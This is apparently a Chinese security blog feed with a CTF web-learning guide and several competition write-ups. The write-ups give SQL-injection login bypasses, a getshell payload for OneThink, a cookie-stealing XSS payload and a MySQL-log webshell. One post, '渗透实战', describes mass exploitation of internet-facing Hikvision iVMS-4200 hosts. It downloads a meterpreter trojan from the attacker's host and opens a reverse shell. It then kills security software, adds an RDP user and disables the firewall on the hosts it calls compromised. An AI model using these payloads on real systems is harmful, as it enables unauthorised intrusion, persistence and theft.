title="常见的编码要掌握"></a>常见的编码要掌握</h2><p>uniocde(<code>&amp;#75;</code>)</p><p>ascii(中文的：<code>\u8fd9</code>)</p><p>base64(<code>YQ==</code>),url(<code>%60</code>)</p><p>UTF-8(中文的：<code>&amp;#x53D1;</code>)</p><p>html实体(<code>&amp;lt;</code>)</p><p>只是举个例子，最好去网上搜一下对应的编码格式然后<strong>认得出来</strong></p><h2 id="代码审计-先理解完bugku的代码审计题"><a href="#代码审计-先理解完bugku的代码审计题" class="headerlink" title="代码审计(先理解完bugku的代码审计题)"></a>代码审计(先理解完bugku的代码审计题)</h2><p>先学下Php的<strong>基础</strong>语法，三个小时不到就学的完，只用看基础语法</p><p>一道好题：<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="noopener">南邮：/x00</a></p><ol><li><p>找到不懂的函数，去网上查，主要是函数特性的</p></li><li><p>察(返回值啊，不能处理数组的函数处理数组返回null)，以及php语言特性的考察比如弱类型</p></li><li><p>strpos处理数组页数返回null</p></li><li><p>sha1函数处理数组返回null</p></li><li><p>MD5函数处理数组返回null</p></li><li><p>ereg%00截断</p></li><li><p>strpos%00绕过 </p></li><li><p>二次urlencode</p></li><li><p>关于弱类型。三叶草出的PHP的悖论1，2这两个题诠释的很不错</p></li></ol><p><a href="https://www.cnblogs.com/L1B0/p/7762909.html" target="_blank" rel="noopener">答案</a></p><ol start="9"><li><p>反序列化(有点复杂，我放后面了)</p></li><li><p>extract变量覆盖<a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="noopener">南邮：变量覆盖</a></p></li><li><p>$GLOBALS：一个包含了全部变量的全局组合数组。变量的名字就是数组的键</p></li></ol><p><a href="http://120.24.86.145:8004/index1.php" target="_blank" rel="noopener">题目</a></p><p><a href="https://blog.csdn.net/auuuuuuuu/article/details/79616285" target="_blank" rel="noopener">答案讲的很详细，推荐一看</a></p><ol start="8"><li>进阶代码审计：<strong>thinkphp3</strong>框架的代码审计题：*</li></ol><p><a href="http://document.thinkphp.cn/manual_3_2.html" target="_blank" rel="noopener">文字教程</a></p><p><a href="http://www.php.cn/course/332.html" target="_blank" rel="noopener">视频教程</a></p><p><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">代码审计小总结</a></p><h3 id="file-get-contents-php-input-的妙用"><a href="#file-get-contents-php-input-的妙用" class="headerlink" title="file_get_contents(php://input)的妙用"></a><code>file_get_contents(php://input)</code>的妙用</h3><p>一个php伪协议，用于读取post的数据，但需要allow_url_include为on的情况下才行。因为php://input相当于读一个远程文件</p><p>file_get_contens(php://input)这样就可以成功突破file_get_contents只能读取文件这个问题</p><p><a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php伪协议学习链接</a></p><p><a href="http://120.24.86.145:8002/web8/" target="_blank" rel="noopener">bugku:web8</a></p><p><a href="https://blog.csdn.net/D_pokemon/article/details/78041170" target="_blank" rel="noopener">答案</a></p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h3 id="eval："><a href="#eval：" class="headerlink" title="eval："></a>eval：</h3><h3 id="例题-bugku的本地包含但是题现在坏了：-eval-“var-dump-a-”"><a href="#例题-bugku的本地包含但是题现在坏了：-eval-“var-dump-a-”" class="headerlink" title="例题. bugku的本地包含但是题现在坏了： eval(“var_dump($a);”);"></a>例题. bugku的本地包含但是题现在坏了： eval(“var_dump($a);”);</h3><ol><li><p>a=);print_r(file(“flag.php”) <code>a=file(&quot;flag.php&quot;)最终会变成var_dump(file(&quot;flag.php&quot;))以数组的形式输出文件内容；</code></p></li><li><p>a=);print_r(file(“flag.php”)</p></li><li><p>a=);var_dump(file(“flag.php”)</p></li><li><p>a=);include(@$_POST[‘b’]在POST里php://filter/convert.base64-encode/resource=flag.php     (php：//filter可以用于读取文件源代码)</p></li></ol><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h3 id="assert"><a href="#assert" class="headerlink" title="assert():"></a>assert():</h3><p><a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">bugku过狗一句话</a></p><p><a href="https://blog.csdn.net/qq_19861715/article/details/79384018" target="_blank" rel="noopener">答案</a></p><p> <a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">命令执行分享链接</a></p><p>  <a href="http://pupiles.com/shellcode.html" target="_blank" rel="noopener">分享链接2</a></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><a href="https://panda1g1.github.io/2018/05/26/php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">学习资料</a></p><p><a href="http://ctf5.shiyanbar.com/10/web1/" target="_blank" rel="noopener">实验吧：天网管理系统</a></p><p><a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">welcome to bugkuctf</a></p><p>bugku质量特别高的一个题，综合性很强，涉及到反序列化</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>常见注入点：</p><p>1.Get、Post</p><p>2.UA头</p><p>3.referer头</p><p>4.cookie</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/web/sqli/" target="_blank" rel="noopener">学习资料</a></p><p>总结的非常好：<a href="http://ratten.me/2018/05/26/Summary%20of%20SQL%20injection/" target="_blank" rel="noopener">学习资料</a></p><p>非常常见的楼的漏洞，危害也非常大：<strong>内容比较多</strong>，简单的可以用<strong>sqlmap</strong>直接跑出来，建议学习sqlilab的系列教程<a href="http://www.baimaoxueyuan.com/course/index/video/id/54" target="_blank" rel="noopener">白帽学院sqli教程视频</a></p><p><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">实验吧：简单的sql注入</a></p><p><a href="ttp://ctf5.shiyanbar.com/web/index_2.php" target="_blank" rel="noopener">实验吧：简单的sql注入2</a></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php" target="_blank" rel="noopener">实验吧：简单的sql注入3</a></p><p><a href="https://www.baidu.com/link?url=OJ_Y9U-wIUkqIGpBGEahOtplsUT4LHYg0OyVEkfhxswnawegLB7DmFHcMkZYQRVHkdS2aeMhe_usVJ3_lDGV7Gh8tXfw62GEKyZdN5jj0UC&amp;wd=&amp;eqid=bcde599e00004307000000055b63d5d8" target="_blank" rel="noopener">实验吧三个简单的sql注入题wp</a></p><h3 id="基于联合查询的注入"><a href="#基于联合查询的注入" class="headerlink" title="基于联合查询的注入"></a>基于联合查询的注入</h3><p>比较基础一个注入<a href="http://120.24.86.145:8002/chengjidan/" target="_blank" rel="noopener">bugku:成绩单</a></p><p><strong>宽字节注入</strong></p><p>(数据库编码是gb2312，gbk,两个字节一个字符，可能存在宽字节注入，也就是注入的时候会将’转义成\’，通过输入%df’，转义之后就是%df%5c’，%df%5c这两个字节就会被合并成汉字 運，后面的’就被释放出来了。)：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2" target="_blank" rel="noopener">南邮sql injection 3</a></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">bugku：报错注入</a></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>建议用脚本或者sqlmap<a href="https://blog.csdn.net/pygain/article/details/53086389" target="_blank" rel="noopener">学习资料</a></p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p><a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php" target="_blank" rel="noopener">实验吧：who are you</a>综合题，难度中等</p><h3 id="外带通道注入-了解"><a href="#外带通道注入-了解" class="headerlink" title="外带通道注入(了解)"></a>外带通道注入(了解)</h3><p>在进行sql注入攻击的时候我们经常会遇见无回显的情况，那我们就不能进行注入了么？</p><p>其实攻击可能已经成功了，But应用程序未返回任何结果，使你误以为攻击失败。</p><p>一种获取数据的有效方法是使用带外通道</p><p>能够在数据库中执行任意SQL语句后,我们可以利用数据的一些内置功能在数据库与自己的计算机直接建立网络连接,通过它传送从数据库中收集的任何信息</p><p><strong>一般可以提取数据的途径</strong>:</p><p>通过HTTP(S)请求、DNS剖析、文件系统、电子邮件等等</p><p>对于MySQL而言</p><p>同样和文件读写一样，需要secure_file_priv这个全局变量控制的权限，具体见上文中对该变量的介绍。</p><p>利用条件：</p><p>全局变量secure_file_priv = ‘ ‘</p><p>可以用SQL server连接到mysql数据库</p><h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>order by 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 order 或者 order by 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p><p><a href="http://115.159.205.137:8001/" target="_blank" rel="noopener">题目</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/web/sqli/" target="_blank" rel="noopener">学习资料</a></p><h3 id="万能登陆-举了一些常见的"><a href="#万能登陆-举了一些常见的" class="headerlink" title="万能登陆(举了一些常见的)"></a>万能登陆(举了一些常见的)</h3><p><strong>用户名和密码一起验证机制：</strong></p><ol><li><p>admin’ or 1=1–+</p></li><li><p>admin’ or ‘1’=’1</p></li><li><p>admin” or 1=1–+</p></li><li><p>admin” or “1”=”1</p></li><li><p>1 or ‘1’=’1’=1</p></li><li><p>1 or ‘1’=’1’ or 1=1</p></li><li><p>‘OR 1=1%00</p></li><li><p>“or 1=1%00</p></li><li><p>‘or ‘1</p></li><li><p>“or “1</p></li><li><p>‘or 1–+</p></li><li><p>“or 1–+</p></li></ol><p><a href="https://blog.csdn.net/tan6600/article/details/46754085" target="_blank" rel="noopener">万能登陆原理及总结</a></p><p><strong>用户名和密码分开验证机制</strong></p><p><strong>密码在服务器端Md5加密后进行对比型</strong>(源代码下面的题中有)：</p><p>绕过方法(用union select 绕过)：</p><p>username中输入：一个不存在的用户名’ union select md5(1)# </p><p>password中输入：1</p><p>原理：服务器验证时，将数据库中该用户名<strong>查询</strong>出的密码和输入的密码进行对比(注意，该题接收密码后又md5加密了一次)，前面用户名一定要输不存在的，让服务器段查询密码时因用户名不存在而为空</p><p>然后用union select MD5(1)构造另一个查询结果：它会返回md5(1)的值，所以<strong>最终查询结果</strong>变成md5(1)</p><p>密码中输入1，因为该题在服务器端会经过md5加密后再与与查询的结果进行对比，MD5(1)=md5(1),成功登陆</p><p><a href="http://ctf5.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">实验吧：程序逻辑问题</a> 拿去练手，题里有源码，可以看看它的验证机制，再来看上面的讲解</p><p><a href="https://blog.csdn.net/dongyanwen6036/article/details/77768345" target="_blank" rel="noopener">答案讲的挺清楚的</a></p><p>这个题有点难<a href="http://118.89.219.210:49165/login.php" target="_blank" rel="noopener">bugku:login2(SKCTF)</a></p><p><a href="http://www.bugku.com/thread-80-1-1.html" target="_blank" rel="noopener">答案：需要VPS</a></p><p><a href="https://www.cnblogs.com/blili/p/9045280.html" target="_blank" rel="noopener">答案：不用VPS</a></p><h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><h3 id="PHP源码泄露"><a href="#PHP源码泄露" class="headerlink" title="PHP源码泄露"></a>PHP源码泄露</h3><p>这个要去了解一下,</p><ol><li><p>.hg源码</p></li><li><p>.git源码泄露</p></li><li><p>.DS_Store文件泄露</p></li><li><p>网站备份压缩文件.rar .zip .7z .tar.gz .bak .swp .txt .html</p></li><li><p>SVN导致的文件泄露</p></li><li><p>CVS泄漏</p></li><li><p>等等等等</p></li></ol><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p><a href="https://baike.baidu.com/item/robots%E5%8D%8F%E8%AE%AE/2483797?fr=aladdin&amp;fromid=9518761&amp;fromtitle=robots.txt" target="_blank" rel="noopener">学习资料</a></p><p><a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php" target="_blank" rel="noopener">题目</a></p><p><a href="http://120.24.86.145:8002/web13/" target="_blank" rel="noopener">bugku：考细心</a></p><p> <a href="https://blog.csdn.net/anjiaowangmenghan/article/details/77604207" target="_blank" rel="noopener">答案</a></p><h3 id="seeion与cookie"><a href="#seeion与cookie" class="headerlink" title="seeion与cookie"></a>seeion与cookie</h3><p><strong>同一个session(需要写脚本)</strong></p><p><a href="http://120.24.86.145:8002/web6/" target="_blank" rel="noopener">bugku速度要快</a>一个需要写脚本的题，建议把做过题的脚本都分类保存下来，ctf的时候改一下就行，前提是你看的懂</p><p><strong>Cookie</strong>与 <strong>Session</strong>，一般都会认为这是两个独立完全不同的东西，Session采用的是在服务器端保持状态的方案，而Cookie采用的是在客户端保持状态的方案</p><p>在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的</p><p><a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="noopener">实验吧：Guess Next Session</a> cookie与session结合考察</p><h3 id="sql约束攻击-好理解-："><a href="#sql约束攻击-好理解-：" class="headerlink" title="sql约束攻击(好理解)："></a>sql约束攻击(好理解)：</h3><p><a href="http://118.89.219.210:49163/" target="_blank" rel="noopener">bugku:login1(SKCTF)</a></p><h2 id="逻辑漏洞-简单"><a href="#逻辑漏洞-简单" class="headerlink" title="逻辑漏洞(简单)"></a>逻辑漏洞(简单)</h2><p><a href="http://nctf.nuptzj.cn/web13/index.php?user1=%59%33%52%6D%64%58%4E%6C%63%67%3D%3D" target="_blank" rel="noopener">南邮：密码重置</a></p><p><a href="https://blog.csdn.net/LANVNAL/article/details/54782320?locationNum=6&amp;fps=1" target="_blank" rel="noopener">答案</a></p><h2 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h2><p>先观察出版本信息，百度或者使用google搜对应版本的漏洞以及exp利用</p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p><a href="http://120.24.86.145:8002/web10/" target="_blank" rel="noopener">bugku:字符？正则？</a></p><p>看一遍正则表达式教程，记不住没关系，遇到忘了的就去翻手册</p><h2 id="安利"><a href="#安利" class="headerlink" title="安利"></a>安利</h2><p>搭建自己的博客,推荐使用Github+Hexo<a href="https://github.com/limedroid/HexoLearning" target="_blank" rel="noopener">教程</a></p><p>熟练使用markdown编写文档<a href="http://blog.leanote.com/post/freewalk/Markdown-%E8%AF%AD%E6%B3%95%E6%89%8B%E5%86%8C" target="_blank" rel="noopener">教程</a></p><p>使用云笔记(推荐为知笔记,有道云笔记,印象笔记)</p><p><a href="http://ratten.me/" target="_blank" rel="noopener">博客推荐</a></p><p><a href="http://hu3sky.ooo/" target="_blank" rel="noopener">博客推荐</a></p><p>关注：<strong>安全客，github，freebuf</strong>等安全网站，安全大牛的推特等拓宽自己知识面</p><ol><li><p><a href="http://hackinglab.cn/ShowQues.php?type=sqlinject" target="_blank" rel="noopener">网络安全实验室</a>：上面的题特别基础，而且很有对比性，有归类，很适合学习使用。然后就是<strong>南邮</strong>和<strong>bugku</strong></p></li><li><p>dvwa和南邮的题网上有全部题的讲解，bugku也基本上都有。 文中有些题没有wp链接是想锻炼你找资源的能力，而且wp那么多，适合自己的才是最好的</p></li><li><p>学习平台:实验吧，i春秋，白帽学院等等等</p></li><li><p>实在做不了的题就用<strong>御剑</strong>扫下目录。此题算是典型，正面做比较难，但是你用御剑扫描会扫出一个目录flag就在里面</p></li></ol><p><a href="http://120.24.86.145:9002/login.php" target="_blank" rel="noopener">bugku:Trim的日记本</a></p><p>而且扫目录也是将来渗透测试信息收集中比较重要的一步。</p><ol start="5"><li><p>基础漏洞学习推荐dvwa，学习的时候尽量亲手操作一遍，动手能力是必须养成的，然后看源码(得简单学习下Php的基础语法)，理解原理，不懂的，网上有针对DVWA很详细的讲解</p></li><li><p>现阶段很多语句不用都背住，写到笔记里，要用的时候拿出来用，多使用几次就记住了。因为出现频率少的，背了也会很快就忘了，用处也不大<strong>但一定要搞懂原理</strong>，才能做到不变应万变</p></li><li><p>要用好搜索引擎，建议用google，这是个好习惯，记不到也没关系，但一定要知道如何搜，最后<strong>多看书，多做题，多总结</strong></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;下面中实验室指的是网络安全实验室&lt;/p&gt;
&lt;p&gt;题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些，&lt;/p&gt;
&lt;p&gt;文中所有知识点内容并不全，要学习&lt;strong&gt;原理&lt;/strong&gt;及&lt;strong&gt;深入&lt;/strong&gt;得自己去找资源学习，自学与搜
      
    
    </summary>
    
      <category term="比赛" scheme="http://yoursite.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>rwctf和南电新生平台一题</title>
    <link href="http://yoursite.com/2018/08/31/rwctf/"/>
    <id>http://yoursite.com/2018/08/31/rwctf/</id>
    <published>2018-08-31T07:24:00.000Z</published>
    <updated>2018-08-31T08:00:48.157Z</updated>
    
    <content type="html"><![CDATA[<p>#rwctf</p><p>##签到题</p><p>想了好久，结果发现只要尝试对这个网站进行常规的攻击，就会给flag，这个比赛果然果然比较接近实战</p><p>##dot free<br>先测试了一下那个输入框里输入的地址会不会访问，发现不会，但是输入不同的值后端传回不同的内容，测试了一下感觉是个正则，因为正则用的比较多，我就想如果给正则传一个意外的值正则有可能会报错看看它后端到底是怎么写的,fuzz测试后发现post url=1会报错，报错页面中存在正则</p><pre><code>e.data.iframe.value.indexOf(&apos;.&apos;) == -1e.data.iframe.value.indexOf(&quot;//&quot;) == -1e.data.iframe.value.indexOf(&quot;。&quot;) == -1typeof(e.data.iframe != &apos;object&apos;)</code></pre><p>ip中不能有. 和//于是十进制构造ip绕过，/\绕过\</p><p>然后是JSON.parse说明要传入一个json_encode<br>于是构造Payload<br><code>http://13.57.104.34/?{&quot;iframe&quot;:{&quot;value&quot;:&quot;\\\\vps的ip:4444&quot;}}</code><br>调用vps的js获取cookie,在vps的xss平台中拿到flag。</p><p>##西电新出的一道代码审计题，没有wp，感觉题还不错，就写一下</p><p><a href="http://13.57.246.101/moe/index.php" target="_blank" rel="noopener">http://13.57.246.101/moe/index.php</a></p><p>第一步正则很好绕，第二部json_decode做了我两个多小时，结果最后总算弄出来了，最后发现这个题的关键是要猜secret的数据是如何构造的，感觉还不错，分享一下，猜测可能是数字和字母的组合，类似6asdwe这种形式，6asdwe==6E0，如果然后全是数字的话类似1.56161这种形式，也用1E0这种方式去绕，如果它全是字母就要这么绕，awsdad==6E-99999999,所以就这样猜测它secret是怎么组合的，利用==号弱类型，比较的时候的类型转换，6e0是6，6a和数字==比较时会只看第一个数字，后面的字母会被抹去，然后6就和6相等了，6e-999999那个是利用超过最大精度处理时会舍去，像0.000000000001就等于0了，0和字母==比较，字母会转换为0,然后就相等了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#rwctf&lt;/p&gt;
&lt;p&gt;##签到题&lt;/p&gt;
&lt;p&gt;想了好久，结果发现只要尝试对这个网站进行常规的攻击，就会给flag，这个比赛果然果然比较接近实战&lt;/p&gt;
&lt;p&gt;##dot free&lt;br&gt;先测试了一下那个输入框里输入的地址会不会访问，发现不会，但是输入不同的值后端传回
      
    
    </summary>
    
      <category term="比赛" scheme="http://yoursite.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透实战</title>
    <link href="http://yoursite.com/2018/08/23/%E6%B8%97%E9%80%8F%E6%B5%B7%E5%BA%B7%E5%8D%AB%E8%A7%86/"/>
    <id>http://yoursite.com/2018/08/23/渗透海康卫视/</id>
    <published>2018-08-22T20:49:00.000Z</published>
    <updated>2020-04-07T15:40:54.964Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透实战"><a href="#渗透实战" class="headerlink" title="渗透实战"></a>渗透实战</h1><p>fofa搜索引擎搜索 “iVMS-4200”</p><p><img src="/haikang/6.png" alt=""></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><a href="https://www.secpulse.com/archives/26462.html" target="_blank" rel="noopener">漏洞利用教程</a></p><h2 id="批量利用"><a href="#批量利用" class="headerlink" title="批量利用"></a>批量利用</h2><p>构造批量攻击exp。将url导入url.txt中。python运行攻击exp</p><p><code>ptyhon haikang.py -f url.txt</code></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>批量getshell</p><p>用菜刀连接webshell</p><p>用Python建立一个http服务用来传输文件</p><p>python -m SimpleHTTPServer 8080</p><p><img src="/haikang/5.png" alt=""></p><h2 id="生成免杀木马"><a href="#生成免杀木马" class="headerlink" title="生成免杀木马"></a>生成免杀木马</h2><p><a href="https://www.cnblogs.com/backlion/p/6785870.html" target="_blank" rel="noopener">免杀教程</a></p><p>##上传木马</p><p>webshell打开命令行窗口运行如下命令，下载生成好的meterpreter木马到目标机上</p><p><code>curl yourip:8000/bk.exe -f bk.exe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost yourip</span><br><span class="line">lhost =&gt; yourip</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure><p>msf开启监听</p><p>肉鸡运行该exe木马</p><p><a href="https://xz.aliyun.com/t/2536#toc-20" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></p><p>getsystem提权</p><p><img src="/haikang/3.png" alt=""></p><p>ps查看进程</p><p>kill掉安全狗等进程</p><p>run post/windows/manage/enable_rdp  #开启远程桌面<br>run post/windows/manage/enable_rdp USERNAME=ls PASSWORD=123456 #添加用户</p><p>通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；<br>添加用户是调用cmd.exe 通过net user添加；</p><p>然后关掉防火墙</p><p><code>netsh firewall set opmode disable</code><br>netsh advfirewall set allprofiles state off </p><p>远程桌面连接</p><p><img src="/haikang/7.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透实战&quot;&gt;&lt;a href=&quot;#渗透实战&quot; class=&quot;headerlink&quot; title=&quot;渗透实战&quot;&gt;&lt;/a&gt;渗透实战&lt;/h1&gt;&lt;p&gt;fofa搜索引擎搜索 “iVMS-4200”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/haikang/6.png&quot; alt=&quot;&quot;
      
    
    </summary>
    
      <category term="比赛" scheme="http://yoursite.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>巅峰极客2018第一场部分wp</title>
    <link href="http://yoursite.com/2018/07/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
    <id>http://yoursite.com/2018/07/28/巅峰极客/</id>
    <published>2018-07-28T04:49:00.000Z</published>
    <updated>2020-04-07T16:07:29.063Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web："><a href="#web：" class="headerlink" title="web："></a>web：</h1><p>拿到题目先百度一下，于是找到onethink的一个漏洞。</p><p>WooYun-2016-185742</p><p>就是注册个账号为：</p><p>%250a%24a%3d%24_GET%5ba%5d%3b%2f%2f%250aecho+%60%24a%60%3b%2f%2f</p><p>就可以getshell， 但因为账号长度有限制。所以分别两个来注册</p><p> 账号一的用户名：%0a$a=$_GET[a];//</p><p> 账号二的用户名：%0aecho <code>$a</code>;//</p><p> 注意要用burp来改包，不然会失败。之后依次登入，也要用burp来改包登入。在那之后然后访问生成的缓存文件</p><p>本题的关键是通过源码<a href="http://www.zip泄露在本地浮现的时候找到生成的缓存文件名" target="_blank" rel="noopener">www.zip泄露在本地浮现的时候找到生成的缓存文件名</a></p><p>例如 /Runtime/Temp/onethink_2bb202459c30a1628513f40ab22fa01a.php</p><p>find / -name flag*<br>查找下flag位置 cat就行了</p><p>/Runtime/Temp/onethink_2bb202459c30a1628513f40ab22fa01a.php?a=cat  /temp/flag</p><p>#杂项</p><p>lsb隐写，三个通道分离出来，Ook，brainfcuk解密就行了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web：&quot;&gt;&lt;a href=&quot;#web：&quot; class=&quot;headerlink&quot; title=&quot;web：&quot;&gt;&lt;/a&gt;web：&lt;/h1&gt;&lt;p&gt;拿到题目先百度一下，于是找到onethink的一个漏洞。&lt;/p&gt;
&lt;p&gt;WooYun-2016-185742&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="比赛" scheme="http://yoursite.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>sctf2018部分wp</title>
    <link href="http://yoursite.com/2018/07/23/sctf2018/"/>
    <id>http://yoursite.com/2018/07/23/sctf2018/</id>
    <published>2018-07-23T01:49:00.000Z</published>
    <updated>2018-08-31T18:02:38.180Z</updated>
    
    <content type="html"><![CDATA[<p>神奇的Modbus<br>发现是pcapng后缀的，用wireshark打开，过滤modbus，追钟tcp流得到flag.<br>推荐去学下wireshark数据包分析，教程太多了适合自己的才是最好的，我就不分享链接了。</p><p>神秘的交易<br> <img src="/ctf/1.png" alt=""><br><img src="/ctf/2.png" alt=""></p><p>学习链接：<a href="https://bbs.pediy.com/thread-151259.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-151259.htm</a></p><p>因为题目告知是一张4442的接触式卡，所以对应发送的命令格式为 一个字节指令类型 一个字节地址 一个字节数据</p><p> <img src="/ctf/3.png" alt=""><br>物体会依次发送该数据包到卡片，其中s1 s2 s3拼在一起就是那三个字节的口令了！</p><ol><li><p>.找数据s1 <img src="/ctf/4.png" alt="">在中间标线处找到0x33<br>的二进制：11001100（注意数完一个字节）</p><p><img src="/ctf/5.png" alt=""></p></li></ol><p><img src="/ctf/6.png" alt=""></p><p>(数完八个)</p><ol start="2"><li>找<img src="/ctf/7.png" alt=""> 中的0x01依次向右数的第二个字节为0x01的二进制(每个字节是八位，所有数八个)接下来的一个字节就是s1了，注意！！！！数据从低位到高位的顺序发送，所以读完8个过后要倒一下，</li><li>二进制转16进制（题目要求的）</li><li>同理可以找到s2和s3. s1,s2,s3拼接起来为加密密钥。</li></ol><p>肥宅快乐题<br>我很喜欢这个题，拿道题的第一反应就是玩，真的是肥宅快乐题。我很快乐，但我不胖。拿到题看到Flash游戏，通关后，注意与NPC的对话哦;)我是真想去通关，正好做题做的好累，但是发现通关一个游戏更累就放弃了，或许这就是我做这个题的动力吧。于是想到下载个flash的反编译软件：<img src="/ctf/8.png" alt=""> 然后打开文件 <img src="/ctf/9.png" alt="">，游戏里所有对话一定写在这某个地方，发现动作里有源代码，搜索游戏中开场的对话，发现每句前面有t0,t1,t2来标识。马上想到可以通过搜索t0找到所有段对话的开始，然后，去最后的几个的t0那里应该就是游戏结束的地方了，果不其然，<br><img src="/ctf/10.png" alt=""><br>：找到了flag，base64解密后获得。这里说个ctf心得吧，我这个题本来可以前三个做出来的，结果上了个厕所，在厕所里玩了会手机，就变成第8个了，所以，做题要专注。。。。。。</p><p>侧信道初探<br>学习链接：<a href="https://g2ex.github.io/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/" target="_blank" rel="noopener">https://g2ex.github.io/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/</a></p><p>简单的能量分析攻击（SPA）真的很简单，<br><img src="/ctf/11.png" alt=""><br> 密钥位为 0 时运算的功耗和密钥位为 1 时运算的功耗存在差异，通过这样的差异分析出密钥位的值，按照一定规律组合得到完整的密钥<br><img src="/ctf/12.png" alt=""><br>以 为分界线分，可以分成10份，然后按照波长也就是宽度。宽的能量消耗大也就对应1，窄的对应0，最后数出来是得flag，之前一直弄不对，最后发现SCTF大写就对了，真的是这里卡太久了，签到题上面都是小写，哎经验不足，丢失大量时间，以后吸取教训。<br>easiest web - phpmyadmin<br>学习链接： <a href="http://www.kernelpicnic.net/2016/03/06/BKPCTF-Suffolk-Downs-Bug-Bounty-Write-Up.html" target="_blank" rel="noopener">http://www.kernelpicnic.net/2016/03/06/BKPCTF-Suffolk-Downs-Bug-Bounty-Write-Up.html</a></p><p>Web服务器现在关了，进不去了，所以就没法附图了，不好意思，不过学习链接的题和这个很像，wp也很详细。推荐去看一波。<br>root/root 弱口令进phpmyAdmin<br>收集下信息，翻看下数据库表，没啥发现<br>尝试写shell，随便猜个路径 /var/www/html<br>失败，提示开启了安全模式<br>尝试利用mysql日志文件写shell<br>show variables like “%general_log”;– 查看变量，发现general_log_file值为c:\phpStudy\mysql\xxx<br>看到phpstudy，猜测网站根目录为phpstudy/www目录</p><p>set global general_log=”ON”;– 开启mysql日志<br>set global general_log_file=”c:/phpstudy/www/shell.php”;– 设置日志保存路径<br>select “&lt;?php @$_GET<a href="$_POST[&#39;c&#39;]">‘f’</a>;?&gt;”;– 写shell<br>菜刀连接，flag在c盘下</p>]]></content>
    
    <summary type="html">
    
      
      
